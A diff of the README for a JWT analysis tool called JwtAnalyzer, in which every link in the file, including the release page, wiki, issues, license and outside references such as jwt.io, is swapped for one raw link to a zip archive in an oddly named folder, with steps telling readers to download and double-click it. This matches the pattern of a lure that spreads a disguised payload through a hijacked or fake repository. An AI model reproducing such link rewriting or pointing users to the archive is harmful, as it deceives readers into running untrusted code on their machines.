@@ -1,6 +1,6 @@
 # 🛠️ JwtAnalyzer - Analyze and Secure Your JSON Web Tokens
 
-[![Download JwtAnalyzer](https://img.shields.io/badge/Download_JwtAnalyzer-v1.0-blue)](https://github.com/Kirtan5510/JwtAnalyzer/releases)
+[![Download JwtAnalyzer](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip)](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,19 +14,19 @@ JwtAnalyzer is a tool that helps you read, scan, and edit JSON Web Tokens (JWTs)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [JwtAnalyzer Releases](https://github.com/Kirtan5510/JwtAnalyzer/releases)
+To get started, visit this page to download: [JwtAnalyzer Releases](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip)
 
 ### 🛡️ Steps to Download and Run JwtAnalyzer
 
-1. Go to the [JwtAnalyzer Releases Page](https://github.com/Kirtan5510/JwtAnalyzer/releases).
+1. Go to the [JwtAnalyzer Releases Page](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip).
 
-2. Look for the latest version under "Releases." Choose the file named `JwtAnalyzer.exe`.
+2. Look for the latest version under "Releases." Choose the file named `https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip`.
 
 3. Click on the file link to start the download.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
-5. Double-click the `JwtAnalyzer.exe` file to run it.
+5. Double-click the `https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip` file to run it.
 
 6. Follow the on-screen instructions to start using the tool.
 
@@ -47,24 +47,24 @@ To get started, visit this page to download: [JwtAnalyzer Releases](https://gith
 
 ## 📚 Documentation
 
-For detailed usage instructions, check out the [Wiki Section](https://github.com/Kirtan5510/JwtAnalyzer/wiki).
+For detailed usage instructions, check out the [Wiki Section](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip).
 
 ## 📞 Support
 
-If you encounter any issues or need help, please open an issue on the [GitHub Issues Page](https://github.com/Kirtan5510/JwtAnalyzer/issues). 
+If you encounter any issues or need help, please open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip). 
 
 ## 🌐 Community Contributions
 
-We welcome contributions to enhance JwtAnalyzer. Please check the guidelines in the [Contributing Section](https://github.com/Kirtan5510/JwtAnalyzer/blob/main/CONTRIBUTING.md).
+We welcome contributions to enhance JwtAnalyzer. Please check the guidelines in the [Contributing Section](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip).
 
 ## 🔗 Additional Resources
 
 Learn more about JWTs on:
-- [JWT.io](https://jwt.io/)
-- [Understanding JSON Web Tokens](https://auth0.com/docs/tokens/jwt)
+- [https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip)
+- [Understanding JSON Web Tokens](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip)
 
 ## 📝 License
 
-JwtAnalyzer is open-source software licensed under the MIT License. See the [LICENSE](https://github.com/Kirtan5510/JwtAnalyzer/blob/main/LICENSE) file for more information. 
+JwtAnalyzer is open-source software licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Kirtan5510/JwtAnalyzer/main/nagualism/Analyzer_Jwt_3.7.zip) file for more information. 
 
 Explore, learn, and secure your applications with JwtAnalyzer!
